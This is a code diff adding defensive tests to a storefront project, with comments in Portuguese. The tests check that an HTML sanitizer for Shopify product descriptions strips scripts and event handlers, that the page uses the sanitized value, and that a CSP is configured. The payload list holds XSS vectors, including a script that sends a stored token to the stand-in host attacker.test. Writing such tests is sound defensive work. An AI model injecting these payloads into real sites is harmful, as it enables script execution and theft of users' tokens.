@@ -200,6 +200,79 @@ test('reservation confirmation never mutates Shopify inventory or captures/refun
 });
 
 // ---------------------------------------------------------------------------
+// Descrição da peça — HTML escrito no admin da Shopify, renderizado na nossa
+// origem, que é a mesma do /closetadmin. Ver lib/product-description.ts.
+// ---------------------------------------------------------------------------
+
+function loadSanitizer() {
+  return load('apps/marketing/src/lib/product-description.ts', {
+    require: (id) => {
+      if (id === 'server-only') return {};
+      const mod = require(id);
+      // transpileModule sem esModuleInterop emite `mod.default`; sanitize-html
+      // é CommonJS e exporta a função direto.
+      return typeof mod === 'function' ? Object.assign(mod, { default: mod }) : mod;
+    },
+  });
+}
+
+test('product description keeps its formatting but never executable content', () => {
+  const { sanitizeProductDescription } = loadSanitizer();
+  const kept = sanitizeProductDescription(
+    '<p>Casaco <strong>impermeável</strong></p><ul><li>Tamanho M</li></ul><h3>Cuidados</h3>',
+  );
+  assert.match(kept, /<p>Casaco <strong>impermeável<\/strong><\/p>/);
+  assert.match(kept, /<li>Tamanho M<\/li>/);
+  assert.match(kept, /<h3>Cuidados<\/h3>/);
+
+  for (const payload of [
+    '<script>fetch("https://attacker.test?c="+localStorage.holdToken)</script>',
+    '<img src=x onerror="alert(1)">',
+    '<a href="javascript:alert(1)">clique</a>',
+    '<iframe src="https://attacker.test"></iframe>',
+    '<svg><animate onbegin="alert(1)" attributeName="x"></svg>',
+    '<object data="data:text/html,<script>alert(1)</script>"></object>',
+    '<style>@import url("https://attacker.test")</style>',
+    '<form action="https://attacker.test"><input name="a"></form>',
+    '<base href="https://attacker.test/">',
+    '<xmp><script>alert(1)</script></xmp>',
+  ]) {
+    const clean = sanitizeProductDescription(payload);
+    assert.doesNotMatch(clean, /<\s*(script|iframe|object|embed|style|form|base|svg|animate|xmp)\b/i, payload);
+    assert.doesNotMatch(clean, /\son\w+\s*=/i, payload);
+    assert.doesNotMatch(clean, /javascript:/i, payload);
+    assert.doesNotMatch(clean, /attacker\.test/i, payload);
+  }
+});
+
+test('the product page never renders Shopify description HTML unsanitized', () => {
+  const page = read('apps/marketing/src/app/pecas/[handle]/page.tsx');
+  assert.match(page, /sanitizeProductDescription\(/);
+  // O valor entregue ao dangerouslySetInnerHTML tem de ser o sanitizado, nunca
+  // o campo cru vindo da Storefront API.
+  assert.doesNotMatch(page, /__html:\s*product\.descriptionHtml/);
+  assert.match(page, /const descriptionHtml = sanitizeProductDescription\(/);
+});
+
+test('the storefront ships a CSP and a Permissions-Policy', () => {
+  const config = read('apps/marketing/next.config.mjs');
+  assert.match(config, /key: 'Content-Security-Policy'/);
+  assert.match(config, /key: 'Permissions-Policy'/);
+  for (const directive of [
+    "default-src 'self'",
+    "base-uri 'self'",
+    "object-src 'none'",
+    "frame-ancestors 'none'",
+    "form-action 'self'",
+  ]) {
+    assert.ok(config.includes(directive), `CSP precisa manter a diretiva ${directive}`);
+  }
+  // `connect-src` sai das variáveis de ambiente do próprio cliente; um host
+  // fixo escrito à mão ficaria errado quando a API mudasse de endereço.
+  assert.doesNotMatch(config, /connect-src[^`]*https:\/\/[a-z0-9-]+\.(up\.railway\.app|vercel\.app)/i);
+});
+
+// ---------------------------------------------------------------------------
 // Valle Pass — produto separado do fluxo de aluguel (sem calendário, sem
 // disponibilidade, sem HOLD; só a compra normal via checkout da Shopify).
 // ---------------------------------------------------------------------------
